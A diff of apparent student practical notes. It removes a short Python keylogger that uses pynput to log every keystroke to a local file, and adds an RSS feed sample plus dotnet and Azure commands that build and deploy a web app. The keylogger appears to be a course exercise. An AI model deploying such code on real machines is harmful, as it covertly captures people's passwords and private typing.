@@ -1,12 +1,32 @@
-from pynput.keyboard import Key , Listener
-import logging
-log_dir = r"D:\\TYCS\\FCS\\"
-logging.basicConfig(
-filename = (log_dir + "keyLog.txt"),
-level=logging.DEBUG,
-format='%(asctime)s:%(message)s'
-)
-def on_press(key):
-logging.info(str(key))
-with Listener(on_press = on_press )as listener :
-listener.join()
+pract 9
+
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+<channel>
+<title>Cloud Computing News</title>
+
+<item>
+<title>Cloud Basics</title>
+<link>https://www.geeksforgeeks.org/cloud-computing/cloud-computing-tutorial/</link>
+<description>Introduction to cloud computing</description>
+</item>
+
+<item>
+<title>Cloud Service Models</title>
+<link>https://www.geeksforgeeks.org/cloud-computing/cloud-based-services/</link>
+<description>IaaS, PaaS and SaaS explained</description>
+</item>
+
+</channel>
+</rss>
+
+commands
+dotnet new mvc --name myApp121
+cd myApp121
+dotnet run
+curl http://localhost:5151
+dotnet publish -o pub
+cd pub
+zip -r site.zip .
+az webapp deploy --src-path site.zip --resource-group practice --name myApp121
+
